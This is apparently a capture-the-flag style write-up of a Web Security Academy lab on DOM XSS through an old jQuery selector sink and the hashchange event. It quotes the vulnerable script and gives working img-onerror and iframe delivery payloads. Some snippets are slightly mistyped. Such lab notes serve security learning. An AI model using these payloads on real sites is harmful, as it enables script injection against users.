# **DOM XSS in jQuery selector sink using a hashchange event**

This one is super tricky, it was the exploitation of a JQuery vulnerability for an old version.

This script:

```
<script>
    $(window).on('hashchange', function(){
        var post = $('section.blog-list h2:contains(' + decodeURIComponent(window.location.hash.slice(1)) + ')');
        if (post) post.get(0).scrollIntoView();
    });
</script>
```

Has a vulnerability because post is not actually null when selector is not found.

### Payload

The idea is to insert this payload somehow

```
var post = $('section-blog-list h2-contains(<img src="0" onerror="alert()">)')
```

Because JQuery error is that it’s parsing the img and creating a detached DOM object, they fixed this in recent versions and now it does not parse the img tag.

### Injection

The url would be https://LAB_ID.web-security-academy.net/#\<img src=’0’ onerror=’print()’\>, we are going to inject it in an iframe and it is print instead of alert because that’s the requirement of the lab.

```
<iframe src="https://LAB_ID.web-security-academy.net/#" onload="this.src+=<img src=0 onerror=print()>"></iframe>
```

How to deliver this is not exactly specified in the lab.
